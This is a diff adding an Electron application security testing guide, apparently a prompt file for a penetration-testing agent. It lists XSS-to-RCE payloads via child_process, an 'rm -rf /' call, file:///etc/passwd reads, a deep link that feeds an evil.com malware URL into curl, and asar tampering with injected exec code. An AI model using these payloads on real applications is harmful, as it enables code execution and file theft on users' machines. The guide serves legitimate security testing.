@@ -1,0 +1,234 @@
+<electron_app_security_guide>
+<title>ELECTRON APPLICATION SECURITY</title>
+
+<critical>Electron apps combine Chromium and Node.js, creating unique attack surface. Focus on nodeIntegration exploitation, contextIsolation bypass, preload script vulnerabilities, remote module abuse, protocol handlers, IPC message interception, and webSecurity bypass. RCE is common due to Node.js access from renderer.</critical>
+
+<scope>
+- nodeIntegration exploitation (Node.js in renderer)
+- contextIsolation bypass
+- Preload script vulnerabilities
+- Remote module abuse (deprecated but still used)
+- Protocol handler attacks (deep links)
+- IPC message interception and injection
+- webSecurity bypass (CORS, CSP disabled)
+- XSS to RCE escalation
+- Update mechanism vulnerabilities
+</scope>
+
+<methodology>
+1. Identify Electron app: check package.json, asar file
+2. Extract source: asar extract app.asar extracted/
+3. Analyze security settings: webPreferences in main.js
+4. Test nodeIntegration: access to require() from renderer
+5. Test contextIsolation: access to main process objects
+6. Test IPC: message injection, authorization
+7. Test protocol handlers: deep link injection
+8. Test XSS: escalate to RCE if nodeIntegration enabled
+</methodology>
+
+<nodeintegration_exploitation>
+<enabled_nodeintegration>
+// main.js
+const win = new BrowserWindow({
+    webPreferences: {
+        nodeIntegration: true  // DANGEROUS
+    }
+})
+
+// renderer.js
+const { exec } = require('child_process');
+exec('calc.exe');  // RCE from any XSS
+</enabled_nodeintegration>
+
+<xss_to_rce>
+- XSS in Electron app with nodeIntegration
+- Direct RCE via require('child_process')
+
+<script>
+require('child_process').exec('whoami', (e, stdout) => {
+    alert(stdout);
+});
+</script>
+</xss_to_rce>
+</nodeintegration_exploitation>
+
+<contextisolation_bypass>
+<disabled_isolation>
+webPreferences: {
+    contextIsolation: false  // renderer and preload share context
+}
+
+// Renderer can access preload-exposed APIs directly
+window.dangerousAPI.executeCommand('rm -rf /')
+</disabled_isolation>
+
+<prototype_pollution>
+- Pollute Object.prototype in renderer
+- Affects preload script execution
+
+// renderer
+Object.prototype.shell = require('child_process');
+
+// preload or main process
+const obj = {};
+obj.shell.exec('whoami');  // uses polluted prototype
+</prototype_pollution>
+</contextisolation_bypass>
+
+<preload_script_vulns>
+<insecure_api_exposure>
+// preload.js
+const { contextBridge, ipcRenderer } = require('electron');
+
+contextBridge.exposeInMainWorld('api', {
+    execute: (cmd) => ipcRenderer.send('execute', cmd)  // No validation
+});
+
+// renderer
+window.api.execute('whoami');  // RCE
+</insecure_api_exposure>
+
+<unsafe_ipc_bridge>
+// Exposing ipcRenderer directly
+contextBridge.exposeInMainWorld('ipc', ipcRenderer);
+
+// renderer can send any IPC message
+window.ipc.send('sensitive-action', malicious_data);
+</unsafe_ipc_bridge>
+</preload_script_vulns>
+
+<remote_module_abuse>
+<deprecated_remote>
+// Still used in older apps
+const { remote } = require('electron');
+remote.require('child_process').exec('calc');
+
+// Or access shell
+remote.shell.openExternal('file:///etc/passwd');
+</deprecated_remote>
+</remote_module_abuse>
+
+<protocol_handler_attacks>
+<deep_link_injection>
+// Registered protocol: myapp://
+myapp://open?file=../../etc/passwd
+myapp://execute?cmd=whoami
+
+// main.js
+app.setAsDefaultProtocolClient('myapp');
+app.on('open-url', (event, url) => {
+    // Unsafe parsing
+    const file = new URL(url).searchParams.get('file');
+    fs.readFile(file);  // path traversal
+});
+</deep_link_injection>
+
+<command_injection>
+myapp://update?url=http://evil.com/malware.exe
+
+// main.js
+const updateUrl = new URL(url).searchParams.get('url');
+exec(`curl ${updateUrl}`);  // command injection
+</command_injection>
+</protocol_handler_attacks>
+
+<ipc_attacks>
+<message_injection>
+// Renderer to main
+ipcRenderer.send('delete-user', { id: 'admin' });
+
+// main.js - no authorization
+ipcMain.on('delete-user', (event, data) => {
+    db.deleteUser(data.id);  // deletes admin
+});
+</message_injection>
+
+<ipc_handler_enumeration>
+// Enumerate IPC handlers
+const { ipcRenderer } = require('electron');
+ipcRenderer.eventNames();  // list all registered events
+
+// Test each
+for (const event of events) {
+    ipcRenderer.send(event, payload);
+}
+</ipc_handler_enumeration>
+</ipc_attacks>
+
+<websecurity_bypass>
+<disabled_security>
+webPreferences: {
+    webSecurity: false  // DANGEROUS
+}
+
+// CORS bypass, file:// access, mixed content
+fetch('file:///etc/passwd').then(r => r.text()).then(alert);
+</disabled_security>
+
+<allowrunninginsecurecontent>
+webPreferences: {
+    allowRunningInsecureContent: true
+}
+
+// Load HTTP scripts from HTTPS page
+// MITM can inject malicious scripts
+</allowrunninginsecurecontent>
+</websecurity_bypass>
+
+<asar_extraction>
+<extract_source>
+# Install asar
+npm install -g asar
+
+# Extract
+asar extract app.asar extracted/
+
+# Analyze
+grep -r "nodeIntegration\|contextIsolation\|webSecurity" extracted/
+</extract_source>
+
+<modify_repackage>
+# Modify source
+echo "require('child_process').exec('whoami')" >> extracted/renderer.js
+
+# Repackage
+asar pack extracted/ app.asar
+
+# Run modified app
+electron app.asar
+</modify_repackage>
+</asar_extraction>
+
+<validation>
+1. Extract app: asar extract, analyze source
+2. Check security settings: nodeIntegration, contextIsolation, webSecurity
+3. Test XSS: if nodeIntegration enabled, escalate to RCE
+4. Test IPC: inject messages, test authorization
+5. Test protocol handlers: deep link injection, command injection
+6. Test preload: exposed APIs, unsafe bridging
+7. Demonstrate impact: RCE, privilege escalation, file access
+</validation>
+
+<impact>
+- Remote Code Execution (XSS → RCE with nodeIntegration)
+- Local file access (webSecurity bypass)
+- IPC message injection (unauthorized actions)
+- Protocol handler abuse (command injection)
+- Update mechanism compromise
+</impact>
+
+<pro_tips>
+1. Check webPreferences in main.js—security starts there
+2. nodeIntegration:true + any XSS = RCE
+3. asar files are just ZIP archives—easy to extract/modify
+4. Protocol handlers often lack input validation
+5. Test with Chrome DevTools: Help → Toggle Developer Tools
+6. IPC messages rarely have authorization—inject freely
+7. Look for update URLs in code—often HTTP, not HTTPS
+8. preload scripts run with Node.js access—high value target
+9. contextIsolation:false allows prototype pollution attacks
+10. Check for enableRemoteModule:true (deprecated but dangerous)
+</pro_tips>
+
+<remember>Secure Electron apps require: nodeIntegration:false, contextIsolation:true, webSecurity:true, proper IPC authorization, input validation on protocol handlers, and secure update mechanisms. Any XSS with nodeIntegration enabled is RCE.</remember>
+</electron_app_security_guide>
